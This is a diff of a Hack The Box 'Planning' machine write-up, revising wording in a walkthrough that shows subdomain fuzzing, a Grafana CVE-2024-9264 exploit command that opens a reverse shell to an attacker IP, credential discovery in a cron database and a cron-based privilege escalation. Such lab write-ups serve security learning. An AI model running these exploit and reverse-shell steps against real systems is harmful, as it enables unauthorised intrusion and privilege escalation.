@@ -68,14 +68,14 @@ We use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for [Subdomain](../
 grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 36ms]
 ```
 
-We can add it to our /etc/hosts file and login in the page with the given creds :
+We can add it to our /etc/hosts file and login in the page with the given creds:
 
 ![Pasted image 20250811223718.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811223718.png)
 # Exploit
 
 [CVE-2024-9264](../../../3%20-%20Tags/CVEs/CVE-2024-9264.md) https://github-com.translate.goog/z3k0sec/CVE-2024-9264-RCE-Exploit?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en
 
-Usage :
+Usage:
 
 ```bash
 python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.174 --reverse-port 1337
@@ -144,7 +144,7 @@ enzo@planning:~$ cat user.txt
 # Privilege Escalation
 ## LinPEAS
 
-We can start [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) running [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) on the target machine, first we copy the script via ssh :
+We can start [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) running [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) on the target machine, first we copy the script via `scp` (ssh) :
 
 ```bash
 ┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Planning/CVE-2024-9264-RCE-Exploit]
@@ -189,7 +189,7 @@ udp        0      0 10.10.11.68:35328       1.1.1.1:53              ESTABLISHED 
  -> Extracting tables from /opt/crontabs/crontab.db (limit 20)
 ```
 
-the file **/opt/crontabs/crontab.db** can have credentials or open a new attack vector so i opened it :
+the file **/opt/crontabs/crontab.db** can have credentials or open a new attack vector so we open that :
 
 ```
 enzo@planning:/$ cat /opt/crontabs/crontab.db                                                                              
@@ -214,7 +214,7 @@ Now we can access, we have a Cronjobs UI so we can create a new Cronjob :
 
 ![Pasted image 20250811232659.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811232659.png)
 
-this command will copy the text in the root flag **/root/root.txt** to a file named root in the /tmp folder, after creating the script all we got to do is to click **Run now button** and check on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :
+this command will copy the text in the root flag **/root/root.txt** to a file named `root` in the `/tmp` directory, after creating the script click **Run now button** and check on the [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) shell :
 
 ```
 enzo@planning:/tmp$ cat root 
